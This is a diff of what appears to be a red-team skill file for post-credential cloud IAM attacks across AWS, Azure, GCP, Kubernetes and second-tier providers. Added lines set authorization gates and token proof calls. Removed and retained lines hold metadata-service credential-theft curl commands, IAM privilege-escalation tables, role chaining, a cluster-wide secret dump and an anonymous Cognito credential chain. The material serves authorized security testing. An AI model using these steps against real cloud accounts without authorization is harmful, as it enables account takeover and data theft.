@@ -1,7 +1,7 @@
 ---
 name: cloud-iam-deep
-description: Cloud IAM red-team attack chain across AWS, Azure, GCP — focused on EXTERNAL exploitation paths and post-credential-discovery privilege analysis. Covers IAM enumeration (aws iam, az role, gcloud iam), STS/AssumeRole chaining, Azure Managed Identity abuse (via SSRF/leak), GCP service account JSON abuse, IMDSv1/v2 attacks via SSRF, K8s ServiceAccount token privilege analysis once held (token discovery / cluster exposure is owned by hunt-k8s), role-trust-policy confused-deputy, cross-account assume-role enumeration, IAM privilege escalation patterns (24+ AWS, 8+ Azure, 6+ GCP), and AWS Cognito Identity Pool unauthenticated-role attack chain (GetId → GetCredentialsForIdentity → IAM role abuse). Built for the case where recon yields a credential (key, JSON, token) and you need to know what it grants and how to escalate. Use when an AWS key / Azure secret / GCP service account JSON / K8s SA token surfaces from a code repo, JS bundle, APK, breach corpus, or SSRF chain.
-sources: aws-iam-docs, azure-rbac-docs, gcp-iam-docs, hackingthe.cloud, pacu, peirates, prowler, rhinosecuritylabs_research, hackerone_public
+description: External cloud IAM post-credential analysis. Recon yields a credential (key, JSON, token) and you need to prove it is live with one read-only identity call, learn what it grants, and map escalation without executing it. AWS (sts get-caller-identity, STS/AssumeRole chaining, 24+ IAM privesc patterns, IMDSv1/v2 via SSRF, Cognito Identity Pool unauthenticated role), Azure (az login, RBAC, Managed Identity tokens), GCP (service account JSON, impersonation chains), K8s ServiceAccount token privileges once held (exposure is owned by hunt-k8s). Also second-tier clouds (DigitalOcean dop_v1, Hetzner, OVHcloud, Linode, Vultr, Scaleway SCW, Alibaba LTAI, Oracle OCI, IBM Cloud, Cloudflare cfut_/cfat_ tokens, Backblaze B2) and IaC/CI federation (Terraform Cloud atlasv1 tokens, Pulumi pul- tokens, GitHub OIDC sub-claim trusts in AWS roles, GCP Workload Identity Federation, Azure federated credentials). Use when a cloud key, token or SA JSON surfaces from a repo, JS bundle, APK, CI log, tfstate or SSRF chain.
+sources: aws-iam-docs, azure-rbac-docs, gcp-iam-docs, provider-api-docs, gitleaks-rules, github-secret-scanning-docs, hackingthe.cloud, pacu, peirates, prowler, rhinosecuritylabs_research, hackerone_public
 report_count: 6
 ---
 
@@ -14,10 +14,25 @@ Trigger when:
 - Recon shows public S3/GCS/Azure-blob with permissions you can verify
 - A Kubernetes API or service-account token is exposed
 - Post-RCE on a cloud-hosted instance — pivot to cloud control plane
+- A second-tier cloud token (DigitalOcean, Hetzner, OVHcloud, Linode, Vultr, Scaleway, Alibaba, OCI, IBM, Cloudflare, Backblaze) turns up in CI logs, tfstate, docker-compose or an app
+- An HCP Terraform / Pulumi token leaks, or you hold read access to a role/identity that trusts a CI OIDC issuer
 
 Do NOT use for:
 - On-prem-only environments (use AD attack skills — but those are out of scope per external-only boundary)
 - Web2 vulns that happen to be on AWS — use the relevant `hunt-*` skill
+- Firebase / Supabase backend rules and Cognito User Pool flows: `hunt-cloud-backends`
+- Finding the credential in the first place: `hunt-source-leak`, `hunt-cicd`, `hunt-cloud-misconfig`, `apk-redteam-pipeline`
+
+---
+
+## Stage A / Stage B (applies to every provider)
+
+| Stage | What | Gate |
+|---|---|---|
+| **A** | One identity/proof call per credential; reading the credential's own scope or policy metadata; reading IAM policies and trust documents; listing resource *names* (first page, small limit) where the program allows going beyond identity | none, but log each call with UTC time |
+| **B** | Reading contents (objects, secrets, DNS records, state files, DB rows); any write, create, delete; creating keys/tokens; `assume-role` beyond the proof call; executing any privesc row; testing "is this token read-write?" by writing | explicit written sign-off |
+
+Record each validation with the output schema and hard rules in `offensive-osint/references/secret-validators.md` §23.10-23.11 (set `provider` to the provider slug). A root/owner/global key: stop after the proof call and hand to the operator.
 
 ---
 
@@ -51,11 +66,37 @@ client_secret pattern + UUID    # Azure AD app credential
 eyJhbGciOiJSUzI1...     # decode kid claim to see issuer
 ```
 
+Routing table for everything else. Regexes already in `offensive-osint/references/secret-patterns.md` are referenced by row number, not repeated; the reference files carry the rest with sources.
+
+| Marker | Provider | Stage A proof call | Detail |
+|---|---|---|---|
+| `AKIA`/`ASIA` + secret | AWS | `aws sts get-caller-identity` | below + `references/aws.md` |
+| SP secret / cert, MI token | Azure | `az login --service-principal ...` then `az account show` | below + `references/azure.md` |
+| `"type": "service_account"` | GCP | `gcloud auth activate-service-account` | below + `references/gcp.md` |
+| `dop_v1_` / `doo_v1_` / `dor_v1_` + 64 hex (catalog #37 covers `dop_v1_`) | DigitalOcean | `GET /v2/account` | `references/second-tier-providers.md` |
+| unprefixed project token, `HCLOUD_TOKEN` | Hetzner Cloud | no whoami; see reference | same |
+| AK + AS + CK triple, `ovh.conf` | OVHcloud | `GET /1.0/auth/currentCredential` | same |
+| `LINODE_TOKEN` (verify) | Linode / Akamai | `GET /v4/profile` | same |
+| `VULTR_API_KEY` (verify) | Vultr | `GET /v2/account` | same |
+| `SCW[A-Z0-9]{17}` + UUID secret | Scaleway | `GET /iam/v1alpha1/api-keys/<access_key>` | same |
+| `LTAI` + 20 alnum | Alibaba Cloud | `aliyun sts get-caller-identity` | same |
+| `~/.oci/config` + PEM, `ocid1.` | Oracle OCI | `oci os ns get` | same |
+| IBM API key, `ibm_cloud_iam_key` | IBM Cloud | `POST /identity/token`, decode | same |
+| `cfut_` / `cfat_` / `cfk_` (2026), legacy 40-char / hex (catalog #35-36) | Cloudflare | `GET /user/tokens/verify` or `/accounts/<id>/tokens/verify` | same |
+| B2 keyID + application key | Backblaze B2 | `GET /b2api/v4/b2_authorize_account` | same |
+| `<14>.atlasv1.<60-70>` | HCP Terraform / TFE | `GET /api/v2/account/details` | `references/iac-state-and-ci-tokens.md` |
+| `pul-` + 40 hex | Pulumi Cloud | `pulumi whoami -v` | same |
+
 ---
 
 ## AWS — read-only validation (the safe first step)
 
 ```bash
+# 0. Whose key is it? Signed with YOUR OWN credentials, never the leaked key.
+#    Returns the owning account ID (AKIA = IAM user or root, ASIA = STS).
+#    Does not say whether the key is active. Check the account is in scope first.
+aws sts get-access-key-info --access-key-id AKIA...
+
 # Set credential
 export AWS_ACCESS_KEY_ID="AKIA..."
 export AWS_SECRET_ACCESS_KEY="..."
@@ -64,6 +105,7 @@ export AWS_SECRET_ACCESS_KEY="..."
 aws sts get-caller-identity
 # Returns: UserId, Account, Arn
 # Arn tells you: IAM user vs role, account ID, name
+# Needs no permission and works even under an explicit Deny (AWS STS API reference)
 
 # 2. WHAT can I do? (the privesc question)
 # Try common read-only first — failures still inform you
@@ -89,87 +131,14 @@ aws ssm describe-parameters --max-results 5 2>&1 | head
 aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `arn:aws:iam::`)]' 2>&1 | head -20
 ```
 
----
+Step 4 lists names only (Stage A where the program allows going beyond identity). Reading a secret value, object or parameter is Stage B.
 
-## AWS privesc patterns (24+ documented — `iam_privesc` techniques)
+## AWS privesc patterns, STS / cross-account / role chaining, IMDSv1 / IMDSv2
 
-Quick lookup — if you have any of these IAM actions, escalate via the listed technique:
-
-| You have | Escalate via |
-|---|---|
-| `iam:CreateAccessKey` | Create access key on any user → impersonate |
-| `iam:CreateLoginProfile` | Set a console password on a user → login |
-| `iam:UpdateLoginProfile` | Reset console password on a user |
-| `iam:AttachUserPolicy` | Attach AdministratorAccess to self |
-| `iam:AttachGroupPolicy` | Attach AdministratorAccess to a group you're in |
-| `iam:AttachRolePolicy` + sts:AssumeRole | Attach to a role you can assume |
-| `iam:PutUserPolicy` | Inline AdministratorAccess to self |
-| `iam:PutGroupPolicy` | Inline policy on a group |
-| `iam:PutRolePolicy` | Inline on a role you can assume |
-| `iam:AddUserToGroup` | Add self to admin group |
-| `iam:UpdateAssumeRolePolicy` + sts:AssumeRole | Modify trust to allow self |
-| `iam:CreatePolicyVersion` | Create v2 of an attached policy with admin |
-| `iam:SetDefaultPolicyVersion` | Switch attached policy to admin version |
-| `iam:PassRole` + ec2:RunInstances | Launch EC2 as admin role → use instance creds |
-| `iam:PassRole` + lambda:CreateFunction/InvokeFunction | Run code as admin role |
-| `iam:PassRole` + cloudformation:CreateStack | CF stack creates resources as admin |
-| `iam:PassRole` + glue:CreateDevEndpoint | Notebook runs as admin role |
-| `iam:PassRole` + datapipeline | Pipeline runs as admin role |
-| `iam:PassRole` + codestar:CreateProject | New project gets admin role |
-| `ec2:RunInstances` (with admin instance profile already on the AMI) | Spin instance, exfil creds from IMDS |
-| `lambda:UpdateFunctionCode` (function has admin role) | Replace code → exfil creds |
-| `lambda:UpdateFunctionConfiguration` | Add layer / env var that exfils |
-| `cloudformation:UpdateStack` | Modify stack to grant self admin |
-| `sts:AssumeRole` (where trust allows you) | Direct privilege jump |
-
-Many of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute.
-
----
-
-## AWS — STS / cross-account / role chaining
-
-```bash
-# Enumerate roles you can assume across accounts
-aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json
-# Parse for "Principal.AWS" containing different account IDs
-
-# Assume a role
-aws sts assume-role --role-arn "arn:aws:iam::OTHER_ACCT:role/CrossAccountRole" --role-session-name "rt-1"
-
-# Set new creds
-export AWS_ACCESS_KEY_ID="ASIA..."
-export AWS_SECRET_ACCESS_KEY="..."
-export AWS_SESSION_TOKEN="..."
-
-# Verify
-aws sts get-caller-identity  # should now show OTHER_ACCT
-
-# Re-enumerate from new identity (chain continues)
-```
-
-**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role.
-
----
-
-## AWS IMDSv1 / IMDSv2 abuse via SSRF
-
-```bash
-# IMDSv1 (legacy, still common — straight GET):
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Returns role name → fetch creds:
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
-# JSON with AccessKeyId, SecretAccessKey, Token, Expiration
-
-# IMDSv2 (requires PUT to get a token first — usually mitigates SSRF):
-curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
-TOKEN=...
-curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# SSRF bypass for IMDSv2:
-# Most server-side fetchers don't issue PUT requests → IMDSv2 blocks them.
-# Exception: SSRF in functions that themselves perform requests with custom headers.
-```
+Moved to `references/aws.md`:
+- **AWS privesc patterns** (24+ `iam_privesc` techniques, `iam:PassRole` combinations, AgentCore code interpreter)
+- **STS / cross-account / role chaining** and the confused-deputy `ExternalId` check. `sts assume-role` beyond the proof call is Stage B.
+- **IMDSv1 / IMDSv2 abuse via SSRF**, refreshed for the 2023-2026 defaults (AL2023, AMI `imds-support v2.0`, account-level `HttpTokensEnforced`, IPv6 `[fd00:ec2::254]`). Endpoint discovery and SSRF bypass stay in `hunt-cloud-misconfig` and `hunt-ssrf`.
 
 ---
 
@@ -178,8 +147,12 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-da
 ```bash
 # Login with a credential
 az login --service-principal -u <appId> -p <password> --tenant <tenantId>
+# Certificate credential: Azure CLI 2.67+ no longer accepts a cert via --password
+az login --service-principal -u <appId> --certificate /path/to/cert.pem --tenant <tenantId>
+# SP with Graph rights but no Azure RBAC: add --allow-no-subscriptions
 # OR with managed identity (from inside Azure VM)
 az login --identity
+# user-assigned MI: --client-id / --object-id / --resource-id (current az login docs)
 
 # Who am I?
 az account show
@@ -198,44 +171,11 @@ az keyvault list --output table
 az vm list --output table
 ```
 
----
+Since 2025-10-01 Microsoft enforces MFA for Azure resource management from CLI, PowerShell, REST, SDK and IaC (phase 2). Workload identities (service principals, managed identities) are not affected, so a leaked SP secret still logs in non-interactively; a leaked *user* password usually does not (Azure blog, "Azure mandatory MFA phase 2").
 
-## Azure — Managed Identity abuse
+## Azure — Managed Identity abuse, Azure privesc patterns
 
-```bash
-# From inside Azure VM (post-RCE or SSRF to IMDS-equivalent):
-# Endpoint: http://169.254.169.254/metadata/identity/oauth2/token
-curl -H "Metadata: true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
-
-# Returns access_token for the Managed Identity. Use:
-TOKEN="..."
-curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
-
-# Get token for Key Vault
-curl -H "Metadata: true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
-
-# Get token for Graph
-curl -H "Metadata: true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"
-# → If Managed Identity has Graph permissions, read all M365 data
-```
-
----
-
-## Azure privesc patterns
-
-| You have | Escalate via |
-|---|---|
-| `Microsoft.Authorization/roleAssignments/write` on tenant | Self-assign Owner |
-| `Microsoft.Authorization/roleDefinitions/write` | Modify role def to add powers |
-| `Microsoft.Compute/virtualMachines/runCommand/action` | Run command on VM (with VM's MI) |
-| `Microsoft.KeyVault/vaults/secrets/getSecret/action` | Read all KV secrets |
-| `Microsoft.Storage/storageAccounts/listkeys/action` | Read all storage blobs |
-| `Microsoft.Web/sites/publishxml/action` | Get publish profile → RCE on app |
-| `Microsoft.Web/sites/host/listkeys/action` | Func app key → RCE via function trigger |
-| `Microsoft.AAD.Directory.* (App reg) + RoleManagement.ReadWrite.Directory` | Grant self Global Admin |
+Moved to `references/azure.md`: the IMDS / App Service token endpoints (refreshed: `api-version=2018-02-01` or later, `IDENTITY_ENDPOINT` + `X-IDENTITY-HEADER`, Metadata Security Protocol GA), and the Azure privesc table. Entra/Graph depth: `m365-entra-attack`.
 
 ---
 
@@ -265,39 +205,11 @@ gcloud sql instances list 2>&1 | head
 gcloud container clusters list 2>&1 | head
 ```
 
----
+Organizations created on or after 2024-05-03 enforce `constraints/iam.managed.disableServiceAccountKeyCreation` by default, so a leaked SA JSON key in a young org was created after someone relaxed that policy: say so in the report.
 
-## GCP privesc patterns
+## GCP privesc patterns, GCP IMDS
 
-| You have | Escalate via |
-|---|---|
-| `iam.serviceAccounts.getAccessToken` on higher-priv SA | Get token for that SA |
-| `iam.serviceAccounts.implicitDelegation` | Chain through delegate SAs |
-| `iam.serviceAccounts.signBlob` / `signJwt` on higher SA | Forge JWT for that SA |
-| `iam.serviceAccountKeys.create` | Create new key for any SA → impersonate |
-| `iam.serviceAccounts.setIamPolicy` | Grant self impersonation rights |
-| `iam.roles.update` (on custom role) | Add admin permissions to a role you have |
-| `cloudfunctions.functions.update` (function runs as high-priv SA) | Replace code → exfil creds |
-| `cloudfunctions.functions.call` + above | Trigger replacement |
-| `compute.instances.setMetadata` | Add ssh-keys metadata → SSH as root |
-| `compute.instances.setServiceAccount` | Attach higher-priv SA to instance |
-| `cloudbuild.builds.create` (build runs as project SA) | Build executes attacker code |
-| `deploymentmanager.deployments.create` | Resources created as DM SA |
-
----
-
-## GCP IMDS attack (via SSRF or post-RCE)
-
-```bash
-# GCP IMDS endpoint:
-curl -H "Metadata-Flavor: Google" \
-  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
-
-# Returns access token. Use:
-TOKEN=...
-curl -H "Authorization: Bearer $TOKEN" \
-  "https://cloudresourcemanager.googleapis.com/v1/projects"
-```
+Moved to `references/gcp.md`: the GCP privesc table (refreshed for secure-by-default org policies and the 2024 Cloud Build default-SA change) and the metadata-server token path (refreshed: `metadata.google.internal`, `169.254.169.254`, IPv6 `fd20:ce::254`, `Metadata-Flavor: Google` required, `X-Forwarded-For` rejected, v0.1/v1beta1 shut down 2020-09-30).
 
 ---
 
@@ -315,6 +227,7 @@ export TOKEN="eyJ..."
 kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-tls-verify get namespaces
 kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-tls-verify auth can-i --list
 kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-tls-verify get pods -A
+# Stage B (sign-off): the next line reads secret values, not just names
 kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-tls-verify get secrets -A
 ```
 
@@ -330,6 +243,22 @@ kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-
 | `nodes/proxy` | Proxy to kubelet on any node → exec via kubelet |
 | `bind` verb on roles | Bind a role you don't have to a subject |
 | `impersonate` on users/groups/SAs | Operate as another principal |
+
+---
+
+## Second-tier cloud providers
+
+Smaller clouds rarely have an STS-style whoami, and their tokens are flat (one token = the whole project or account), so the proof call alone is often the whole finding. Per-provider formats, proof calls, scope model, env-var names and leak locations are in `references/second-tier-providers.md`. Points that change triage:
+
+- **Readable scope in one call:** OVHcloud (`/auth/currentCredential` returns the access rules), Backblaze B2 (`b2_authorize_account` returns capabilities, buckets and name prefix), Vultr (`/v2/account` returns `acls`), Linode (`/v4/profile/tokens` lists each token's scopes and first 16 characters).
+- **Scope not readable without a write:** Hetzner Cloud (Read vs Read & Write) and DigitalOcean custom scopes. Report "live, permission level unknown" rather than testing a write.
+- **Auto-revocation:** DigitalOcean, Alibaba, Oracle, IBM, Cloudflare and HCP Terraform / Pulumi are GitHub secret scanning partners, and Cloudflare revokes leaked tokens in both formats. A token from public GitHub is often already dead; tokens from APKs, CI logs, images and tfstate are the live ones.
+
+---
+
+## IaC platform tokens and CI-to-cloud federation
+
+`references/iac-state-and-ci-tokens.md` covers leaked HCP Terraform / TFE tokens (token types, `account/details` proof, state-version access without downloading state) and Pulumi tokens, plus reading CI-to-cloud trust from the cloud side once you hold read credentials: AWS OIDC role trust policies (identity-provider controls for shared issuers, legacy roles that predate them), GCP Workload Identity Federation attribute conditions, and Azure federated identity credentials including flexible (wildcard) credentials. Running a workflow to prove the trust is `hunt-cicd` and is Stage B.
 
 ---
 
@@ -349,7 +278,7 @@ kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-
 | **GCPBucketBrute** | GCP | GCS bucket permission enumeration |
 | **gcpwn** | GCP | GCP-specific exploitation framework |
 | **Peirates** | K8s | Container/cluster exploitation toolkit |
-| **kube-hunter** | K8s | Auto-scan cluster from inside/outside |
+| **kube-hunter** | K8s | Unmaintained (README: "not under active development anymore"); Aqua points to Trivy's Kubernetes scanning instead |
 | **kubectl-trace** | K8s | Trace processes (post-foothold) |
 
 ---
@@ -363,6 +292,7 @@ kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-
 - **DO NOT assume an STS token from one account works across accounts** — region restrictions and trust policies apply
 - **DO NOT skip CloudTrail/Activity Log awareness** — every API call is logged; pair with `mid-engagement-ir-detection`
 - **DO NOT pivot deeper than the SOW allows** — discovering admin creds doesn't mean using them; some engagements are read-only
+- **DO NOT test a flat token's write permission by writing** (Hetzner, DigitalOcean, Cloudflare): that is Stage B
 
 ---
 
@@ -372,6 +302,8 @@ kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-
 - `hunt-ssrf` — SSRF→IMDS is the canonical chain into cloud control plane
 - `apk-redteam-pipeline` — APK secret extraction commonly yields cloud creds
 - `supply-chain-attack-recon` — CI/CD pipelines store cloud creds; finding them is a separate workflow
+- `hunt-cicd` — workflow injection, tfstate discovery and proving an OIDC trust from a workflow you control
+- `hunt-source-leak` — `.env`, source maps, `.git` and build artifacts that carry the tokens
 - `m365-entra-attack` — Azure cross-product; Managed Identity tokens cross over to Graph
 - `mid-engagement-ir-detection` — cloud control plane activity is monitored; expect mitigations
 
@@ -390,6 +322,8 @@ kubectl --token=$TOKEN --server=https://k8s.target.example:6443 --insecure-skip-
 | Anonymous public bucket — listing only | Low/Medium |
 | Anonymous bucket — write permission | High |
 
+Second-tier and IaC tokens: `references/second-tier-providers.md` and `references/iac-state-and-ci-tokens.md` each carry their own table.
+
 ---
 
 ## Cleanup discipline (deliverable hygiene)
@@ -405,109 +339,19 @@ Cloud activity is trivially auditable; the client WILL find it post-engagement. 
 
 ## AWS Cognito Identity Pool — Unauthenticated-Role Attack Chain (2024-2026 surface)
 
-AWS Cognito has two distinct services often confused: **User Pools** (auth provider) and **Identity Pools** (federated identity → IAM credentials). Identity Pools can be configured with *"Enable access to unauthenticated identities"* — which gives ANY anonymous caller an IAM role via `cognito-identity:GetId` → `cognito-identity:GetCredentialsForIdentity`. Mobile apps and SPAs ship the IdentityPoolId in the page bundle. Developers commonly attach overly-broad IAM permissions to the unauth role, especially when the pool was set up for AWS Amplify / Pinpoint / CloudWatch RUM and the role policy was never narrowed.
+Moved verbatim to `references/aws.md` (discovery regexes, `GetId` → `GetCredentialsForIdentity` → `sts get-caller-identity`, permission enumeration, severity rubric, disclosed cases, reporting tip). The 60-second test is unchanged: if `GetId → GetCredentialsForIdentity → sts get-caller-identity` succeeds anonymously, you have a finding. Cognito User Pool and other BaaS backends: `hunt-cloud-backends`.
 
-### Step 1 — Discover the IdentityPoolId
+---
 
-The IdentityPoolId is a **public identifier** by AWS design (`<region>:<UUID>` format). The find:
+## References Index
 
-```bash
-# JS bundle / SPA regex (against *.js, *.html, source-map files)
-grep -ErohE "identityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
-grep -ErohE "IdentityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
-grep -ErohE "\"PoolId\"\s*:\s*\"([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})\"" .
-
-# Mobile APK (after jadx decompile)
-grep -rEi "identity[_-]?pool[_-]?id" decoded/
-grep -rE "\"[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}\"" decoded/
-
-# Also check
-amplifyconfiguration.json
-awsconfiguration.json
-aws-exports.js
-.env.js
-*.js.map
-```
-
-Wayback CDX captures, GitHub code-search for the apex domain + `IdentityPoolId`, and JS chunks linked from `index.html` are the high-yield search corpora.
-
-### Step 2 — `GetId` (unauth)
-
-```bash
-aws cognito-identity get-id \
-  --identity-pool-id us-east-1:abcd1234-5678-90ab-cdef-1234567890ab \
-  --region us-east-1 \
-  --no-sign-request
-```
-
-`--no-sign-request` is critical — tells the CLI not to look for ambient AWS credentials. Returns `{"IdentityId": "us-east-1:<uuid>"}`. If this returns `NotAuthorizedException`, unauth identities are disabled — stop, not exploitable.
-
-### Step 3 — `GetCredentialsForIdentity`
-
-```bash
-aws cognito-identity get-credentials-for-identity \
-  --identity-id us-east-1:<returned-uuid> \
-  --region us-east-1 \
-  --no-sign-request
-```
-
-Returns real STS credentials with ~1 hour TTL: `AccessKeyId` (ASIA…), `SecretKey`, `SessionToken`, `Expiration`.
-
-### Step 4 — Confirm role ARN
-
-```bash
-export AWS_ACCESS_KEY_ID=ASIA...
-export AWS_SECRET_ACCESS_KEY=...
-export AWS_SESSION_TOKEN=...
-aws sts get-caller-identity
-```
-
-Returns role ARN like `arn:aws:sts::<account>:assumed-role/Cognito_<PoolName>Unauth_Role/CognitoIdentityCredentials`. Account ID is now disclosed.
-
-### Step 5 — Enumerate role permissions
-
-Direct (rare):
-```bash
-aws iam get-role --role-name Cognito_<PoolName>Unauth_Role
-aws iam list-role-policies --role-name Cognito_<PoolName>Unauth_Role
-aws iam list-attached-role-policies --role-name Cognito_<PoolName>Unauth_Role
-```
-
-Blackbox (the normal case) — fire a permission probe across high-value services and observe `AccessDenied` vs success. Pacu's `iam__enum_permissions --role-name <name>` brute-forces ~500 IAM actions; `enumerate-iam.py` by Andrés Riancho covers ~1000. Common over-permissions: `s3:Get*`/`s3:List*`, `dynamodb:Scan`, `lambda:InvokeFunction`, `appsync:GraphQL`, `cognito-idp:AdminCreateUser`, `iam:PassRole`, `kms:Decrypt`.
-
-### Severity rubric
-
-| Finding | Severity | Justification |
+| File | Coverage | Trigger phrases |
 |---|---|---|
-| Unauth role with `*:*` or `AdministratorAccess` | **Critical** (9.8+) | Full AWS account takeover |
-| Unauth role with `s3:Get*` / `s3:List*` on production customer buckets, or `dynamodb:Scan` on user tables | **Critical** (9.1-9.8) | Mass PII / data breach |
-| Unauth role with `appsync:GraphQL` on production API, or `lambda:InvokeFunction` on internal lambdas | **Critical** (9.0) | Authenticated backend access |
-| Unauth role with `cognito-idp:Admin*` on the linked User Pool | **Critical** (9.1) | Mass ATO primitive |
-| Unauth role with `iam:PassRole` + create-function | **Critical** (9.8) | Documented priv-esc to admin |
-| Unauth role with `s3:PutObject` on web-hosting bucket | **High** (8.1) | Stored XSS / supply-chain |
-| Unauth role with `kms:Decrypt` on a customer CMK | **High** (7.5-8.5) | Depends on ciphertext reachability |
-| Unauth role with read-only on a single hardcoded non-sensitive resource | **Medium** (5.3) | Limited business impact |
-| Unauth identities enabled but role policy denies everything | **Informational** | Best-practice deviation only |
-
-### Disclosed cases / authoritative writeups
-
-1. **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020, refreshed 2023)** — original research establishing the attack class. `GetCredentialsForIdentity` against unauth pools with default `*` policies. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
-2. **Rhino Security Labs — Pacu `cognito__enum_identity_pools` module** — production tooling that automates Steps 1-5 of the chain. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu/tree/master/pacu/modules/cognito__enum_identity_pools)
-3. **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — walkthrough of identityPoolId extraction → assume guest role → S3/DynamoDB/Lambda enumeration. Calls out RUM, Amplify, Pinpoint as the three SDKs that commonly expose the pool ID in HTML. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
-4. **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook covering Steps 1-5. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
-5. **Spaceraccoon / Eugene Lim — "Mass Account Takeover via Cognito IdentityPool" (Medium, 2020)** — SaaS provider exposed IdentityPoolId in Amplify config; unauth role had `cognito-idp:AdminConfirmSignUp` + `AdminUpdateUserAttributes` on the linked User Pool — silent confirmation of any signup + email change = mass ATO.
-6. **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry across Datadog customer base showing real-world Cognito pool abuse. Non-trivial percentage of pools paired with policies broader than the minimum required. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
-
-### Reporting tip
-
-Always include in the report:
-- `sts get-caller-identity` output (proves the role ARN + account ID)
-- Pacu `iam__enum_permissions` JSON output (proves the granted actions)
-- A concrete data-pull PoC (one sample S3 object listing, one DynamoDB record with PII redacted)
-
-Without all three, triagers downgrade to Medium. The 60-second test is `GetId → GetCredentialsForIdentity → sts get-caller-identity`. If you reach step 3 anonymously, you have a finding.
-
-Cross-reference: `hunt-cloud-misconfig` → `CloudWatch RUM weaponization` covers the specific RUM-embedded variant of this attack class.
+| `references/aws.md` | AWS privesc table, STS / cross-account chaining (Stage B gate), IMDSv1/v2 with 2023-2026 defaults, Cognito Identity Pool unauth chain | iam privesc, passrole, assume role, confused deputy, imdsv2, httptokens, cognito identity pool |
+| `references/azure.md` | Managed Identity token endpoints (VM IMDS, App Service), Metadata Security Protocol, Azure privesc table | managed identity, msi token, identity_endpoint, imds azure, runcommand, roleassignments write |
+| `references/gcp.md` | GCP privesc table with secure-by-default notes, metadata-server token path | serviceaccountkeys create, actas, getaccesstoken, metadata-flavor, cloud build sa |
+| `references/second-tier-providers.md` | DigitalOcean, Hetzner Cloud, OVHcloud, Linode/Akamai, Vultr, Scaleway, Alibaba Cloud, Oracle OCI, IBM Cloud, Cloudflare, Backblaze B2 | dop_v1, hcloud_token, ovh consumer key, linode token, vultr api key, scw access key, ltai, oci config, ibm api key, cfut_, cfat_, b2 application key |
+| `references/iac-state-and-ci-tokens.md` | HCP Terraform / TFE and Pulumi tokens, GitHub/GitLab/HCP Terraform OIDC trusts in AWS, GCP WIF, Azure federated credentials | atlasv1, tf_token, pul-, oidc sub claim, token.actions.githubusercontent.com, workload identity federation, federated credential |
 
 ---
 
@@ -516,6 +360,7 @@ Cross-reference: `hunt-cloud-misconfig` → `CloudWatch RUM weaponization` cover
 - **`hunt-ssrf`** — Most external paths to a cloud credential begin with SSRF reaching the metadata service. Chain primitive: SSRF + IMDSv1 → instance role token → `cloud-iam-deep` privilege-escalation patterns reach prod S3 / Secrets Manager.
 - **`hunt-cloud-misconfig`** — Public buckets and exposed configs are the most common credential-leak vector. Chain primitive: Cloud misconfig (`.env` in public S3) + leaked AWS access key → IAM enumeration → `iam:PassRole` chain to admin.
 - **`supply-chain-attack-recon`** — CI/CD often holds long-lived deploy credentials. Chain primitive: Exposed GitHub Actions OIDC misconfig + assume-role permission → `cloud-iam-deep` cross-account role assumption.
+- **`hunt-cicd`** — Chain primitive: public tfstate or CI log yields an HCP Terraform / Cloudflare / DigitalOcean token → `references/iac-state-and-ci-tokens.md` or `references/second-tier-providers.md` proof call → scope read.
 - **`m365-entra-attack`** — Azure Managed Identity overlaps Entra service principals. Chain primitive: SSRF on Azure App Service → Managed Identity token → `m365-entra-attack` Graph API enumeration → cross-tenant escalation.
 - **`security-arsenal`** — Load the Cloud IAM Privilege-Escalation Payload Pack (24+ AWS, 8+ Azure, 6+ GCP escalation patterns with `aws cli` one-liners).
 - **`triage-validation`** — Apply the Server-State-vs-Policy gate: a permissive IAM policy alone is not a finding; demonstrate actual privileged action (e.g., read prod secret, create cross-account role) before reporting.
